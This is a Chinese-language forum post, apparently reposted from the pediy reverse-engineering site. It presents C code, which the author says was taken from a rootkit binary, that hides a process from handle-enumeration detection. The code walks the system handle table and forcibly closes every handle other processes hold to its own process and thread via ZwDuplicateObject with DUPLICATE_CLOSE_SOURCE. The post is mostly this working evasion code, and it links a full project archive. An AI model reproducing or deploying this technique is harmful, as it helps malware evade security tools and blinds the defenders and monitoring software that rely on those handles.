
# 抹掉所有进程中自己的 Handle

> 原文：[`www.pediy.com/kssd/pediy10/70269.html`](https://www.pediy.com/kssd/pediy10/70269.html)

之前听过一个检测进程的想法，就是暴力枚举所有进程中的 `handle`，查找其中类型为 `PROCESS` 的。

此法也被炉子牛用于他的 `LzOpenProcess()`。

下面我就写了一断代码来对抗这个方法，纯属小伎俩，写写练手，牛牛们飘过～

严格说，此段代码不算原创，是从某 `rootkit` 的 `bin` 中扒出来的，因此基本保留其原貌，经我修改测试，主要函数如下：

```c
void CloseAllmyHandles()
{
    HANDLE hCurProcess, hSouceProcessHandle, hTargetHandle;
    HANDLE hMyProcess = INVALID_HANDLE_VALUE, hMyThread = INVALID_HANDLE_VALUE;
    DWORD pid, nBufferLen = 0x40000, nRetnLen = 0;
    DWORD HandleCnt, NumberOfHandles;
    DWORD pMyProcessObject = 0, pMyThreadObject = 0, pObject;
    CLIENT_ID myCid, tmpCid;
    PVOID pBuffer = NULL;
    NTSTATUS status;
    OBJECT_ATTRIBUTES ObjectAttributes;

    myCid.UniqueProcess = (HANDLE)my_GetProcessId();
    myCid.UniqueThread = (HANDLE)my_GetThreadId();

    InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);

    ZwOpenProcess(&hMyProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &myCid);
    ZwOpenThread(&hMyThread, PROCESS_ALL_ACCESS, &ObjectAttributes, &myCid);

    printf("hMyProcess:0x%08x\n", hMyProcess);
    printf("hMyThread :0x%08x\n", hMyThread);

    hCurProcess = GetCurrentProcess();

    status = ZwAllocateVirtualMemory(hCurProcess, &pBuffer, 0, &nBufferLen, MEM_COMMIT, PAGE_READWRITE);
    if (!NT_SUCCESS(status))
    {
        printf("Alloc Memory failed.\n");
        return;
    }

    printf("Alloced Buffer:0x%08X\n", pBuffer);

    ZwQuerySystemInformation(SystemHandleInformation, pBuffer, nBufferLen, &nRetnLen); // 16=SystemHandleInformation
    printf("Searching handles...\n");

    HandleCnt = *(DWORD*)pBuffer;
    printf("Handle Count:%d\n", HandleCnt);

    if (HandleCnt > 1)
    {
        NumberOfHandles = *(DWORD*)pBuffer;
        pHandleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)((char*)pBuffer + sizeof(DWORD));
        do
        {
            //printf("HandleValue:0x%08X\n", pHandleInfo->HandleValue);
            if (pHandleInfo->HandleValue == (USHORT)hMyThread)
            {
                if (pHandleInfo->UniqueProcessId == (USHORT)myCid.UniqueProcess)
                {
                    pMyThreadObject = *(DWORD*)&(pHandleInfo->Object);
                    printf("Thread finded\n");
                }
            }
            if (pHandleInfo->HandleValue == (USHORT)hMyProcess)
            {
                if (pHandleInfo->UniqueProcessId == (USHORT)myCid.UniqueProcess)
                {
                    pMyProcessObject = *(DWORD*)&(pHandleInfo->Object);
                    printf("Process finded\n");
                }
            }
            ++pHandleInfo;
            --NumberOfHandles;
        } while (NumberOfHandles);
    }

    ZwClose(hMyThread);
    ZwClose(hMyProcess);
    printf("Found my object ok.\nBegin Search and Close...\n");

    NumberOfHandles = HandleCnt;
    if (HandleCnt >= 1)
    {
        pHandleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)((char*)pBuffer + sizeof(DWORD));
        do
        {
            pObject = *(DWORD*)&(pHandleInfo->Object);
            if (pMyProcessObject == pObject || pMyThreadObject == pObject)
            {
                printf("Found Handle=0x%08X OwnerPID=%4d\n", pHandleInfo->HandleValue, pHandleInfo->UniqueProcessId);
                tmpCid.UniqueProcess = (HANDLE)pHandleInfo->UniqueProcessId;
                tmpCid.UniqueThread = 0;
                InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
                status = ZwOpenProcess(&hSouceProcessHandle, PROCESS_DUP_HANDLE, &ObjectAttributes, &tmpCid);
                //PrintZwError("ZwOpenProcess", status);
                if (!status)
                {
                    status = ZwDuplicateObject(
                        hSouceProcessHandle,
                        (void*)pHandleInfo->HandleValue,
                        hCurProcess,
                        &hTargetHandle,
                        0,
                        0,
                        DUPLICATE_CLOSE_SOURCE);
                    if (!status)
                    {
                        ZwClose(hTargetHandle);
                        printf("Handle closed!\n");
                    }
                    //PrintZwError("ZwDuplicateObject", status);
                    ZwClose(hSouceProcessHandle);
                }
            }
            ++pHandleInfo;
            --NumberOfHandles;
        } while (NumberOfHandles);
    }

    ZwFreeVirtualMemory(hCurProcess, &pBuffer, &nBufferLen, MEM_RELEASE);
}
```

完整工程源码：

上传的附件

| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) | `CloseAllMyHandles.rar` |
| :--- | :--- |
